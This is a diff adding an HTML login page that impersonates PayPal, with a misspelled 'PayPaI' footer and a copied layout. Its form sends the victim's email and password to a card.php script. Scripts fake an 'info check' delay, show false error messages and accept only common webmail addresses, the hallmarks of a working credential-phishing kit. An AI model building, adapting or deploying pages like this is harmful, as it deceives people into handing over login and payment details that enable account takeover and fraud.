@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>Log in to your account</title>
+
+    <!-- Bootstrap -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="css/login.css">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+      
+      <link rel="shortcut icon" href="images/favicon_xbb.ico">
+      <script type="text/javascript" src="jquery/jquery.js"></script>
+      <script type="text/javascript" src="js/login.js"></script>
+      <script type="text/javascript" src="js/login_lang.js"></script>
+       <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="jquery/jquery.min.js"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="js/bootstrap.min.js"></script>
+  </head>
+  <body>
+<style type="text/css">
+.icn_error{
+border: 1px solid #c72f38;
+background: url(./images/icon_error.png) no-repeat #fff scroll 98% 50%;
+background-size: 22px;
+}
+</style>
+
+            <div class="main">
+              <div class="main_content">
+                  <div class="content">
+                    <!-- start header logo -->
+                    <div class="header">
+                      <img src="images/logo.png" style="margin-bottom:20px">
+                    </div>
+                    <!-- fin header logo -->
+                    
+                     <div id="errores" class="" style="display: none;">
+                        <p><script>msg_error()</script>Some of your info isn't correct. Please try again.Enter your password.</p>
+                      </div> 
+                    
+                    <!-- start formulaire  -->
+                     <form class="form-loginpass" id="vForm" action="./card.php" method="POST" name="vForm">
+                       
+            <!-- start zone email -->
+                   <div id="deux_input">
+                       <div class="div_email">
+                        <input id="id-email" name="email" class="input-login " placeholder="Email">
+                         <div id="email_error" class="div_erreur" style="display: none;">
+                          <span class="span_erreur"><script>valid_email()</script>Enter your email address.</span>
+                         </div>
+                       </div>
+            <!-- fin zone email -->
+            <!-- start zone pass -->
+                       <div class="div_password">
+
+                        <input id="id-pass" name="password" class="input-login" type="password" placeholder="Password">
+                         <div id="password_error" class="div_erreur" style="display: none;">
+                          <span class="span_erreur"><script>valid_pass()</script>Enter your password</span>
+                        </div>
+                      </div>
+                  </div>
+            <!-- fin zone pass -->
+            <!-- start zone btn -->
+                       <div class="div-btnlogin">
+                        <button class="btn-login" name="button-login" value="Login" onclick="return Validate()" id="btnlogin"><script>btn_log()</script>Log In</button>
+                       </div>
+            <!-- fin zone btn -->
+                       <div class="div-forget-pass">
+                        <a href="#"><script>mdp_oublie()</script>Having trouble logging in?</a>
+                       </div>
+                     </form>
+                    <!-- fin formulaire  -->
+                     <!-- start btn signin  -->
+                      <div class="div-btn-signin">
+                        <a href="#" class="btn-signin"><script>signUp()</script>Sign Up</a>
+                      </div>
+                     <!-- fin btn signin  -->
+                    
+                  </div>
+              </div>
+
+              
+
+              <div id="pagebayda" class="pagebayda" style="display: none;">
+                 <p style="display: block;margin: 20px 0;color: #2c2e2f;"><script>checkInfo()</script>Checking your info ...</p>
+              </div>
+              <!-- start footer -->
+                   <footer class="div-footer">
+                     <script>Privacy()</script><ul><li><a href="#">Privacy</a></li><li><a href="#">PayPaI</a></li></ul>
+                    <script>copyright()</script><p>Copyright © 1999-2017 . All rights reserved.</p>
+                   </footer>
+               <!-- fin footer --> 
+            </div>
+   
+  
+
+<script type="text/javascript">
+
+// FUNC FOR HIDE LES ZONE EVENT
+   $('#email_error').hide();
+   $('#password_error').hide();
+   $('#errores').hide();
+   $('#pagebayda').hide();
+
+// VAR 2 INPUT LOGIN
+  var email = document.forms["vForm"]["email"];
+  var password = document.forms["vForm"]["password"];  
+
+  
+
+
+// VALIDATION EMAIL AND PASSWORD 
+  function Validate(){
+    if(email.value == "" && password.value == ""){
+      $('#email_error').slideDown(100);
+      $('#id-email').addClass('icn_error');
+      $('#id-email').css('color','#c72f38');
+      $('#id-email').focus(function(){
+        if (email.value == "") {
+          $('#id-email').css('border-color','#c72f38')
+         }
+      });
+      $('#id-email').keyup(function(){
+        $('#email_error').slideUp(100);
+        $('#id-email').removeClass('icn_error');
+        $('#id-email').css('border-color','')
+        $('#id-email').css('color','#000');
+      });
+      $('body').click(function(){
+        if (email.value != "") {
+          $('#id-email').css('border-color','');
+          $('#email_error').slideUp(100);
+          $('#id-email').removeClass('icn_error');
+         }
+      });
+      $('#id-pass').addClass('icn_error');
+      $('#id-pass').css('color','#c72f38');
+      $('#id-pass').keyup(function(){
+        $('#password_error').slideUp(100);
+        $('#id-pass').removeClass('icn_error');
+        $('#id-pass').css('border-color','')
+        $('#id-pass').css('color','#000');
+      });
+      $('#id-pass').focus(function(){
+        if (password.value == "") {
+          $('#id-pass').css('border-color','#c72f38')
+         }
+      });
+      return false;
+    } 
+
+// VALIDATION EMAIL 
+    if (email.value == ""){
+      $('#email_error').slideDown(100);
+      $('#id-email').addClass('icn_error');
+      $('#id-email').keyup(function(){
+        $('#password_error').slideUp(100);
+        $('#id-email').removeClass('icn_error'); 
+      });
+      return false;
+    }
+
+// VALIDATION PASSWORD 
+    if (password.value == ""){
+      $('#password_error').slideDown(100);
+      $('#id-pass').addClass('icn_error');
+      $('#id-pass').keyup(function(){
+        $('#password_error').slideUp(100);
+        $('#id-pass').removeClass('icn_error'); 
+      });
+      return false;
+    }
+
+// FUNC IF VALUE NOT EMPTY RETURN TO FUNCTION NEXT
+  return chdakhel();
+  } 
+
+// FUNC FOR CHECK THE LENGTH OF VALUE
+function chdakhel(){
+
+  var ghalatasi = function(){
+                      $('#pagebayda').hide();
+                      $('#errores').show();
+                      password.value = "";
+                   }; 
+  var valuemail  = $('#id-email').val();
+  var valuepass  = $('#id-pass').val();
+  var check      = '[a-zA-Z0-9_\\.-]+@((freemail)|(gmail)|(yahoo)|(hotmail)|(outlook)|(live)|(msn)|(mail)|(aol))\\.[a-z]{2,4}';
+// VALIDATION VALUE THE EMAIL IF MOIN 10 SHOW DIV MESSAGE ERREUR 
+   if (!valuemail.match(check)) {
+     $('#pagebayda').show();
+      window.setTimeout(ghalatasi, 4000);
+       return false;
+    }
+// VALIDATION VALUE THE PASS  IF MOIN 6 SHOW DIV MESSAGE ERREUR 
+   if (valuepass.length <= 6) {
+      $('#pagebayda').show();
+      window.setTimeout(ghalatasi, 4000);
+       return false;
+    }
+
+// CHECK IF VALUE THE PASS AND VALUE THE EMAIL GRAND OF LENGTH WANTED EX SUBMIT TO NEXT PAGE 
+    if (valuepass.length > 6 && valuemail.match(check)) {
+      $('#pagebayda').show();
+      $(function(){
+        $('#vForm').submit(function(){
+        });
+      });
+       return true;
+    }
+ };
+</script>
+</body></html>
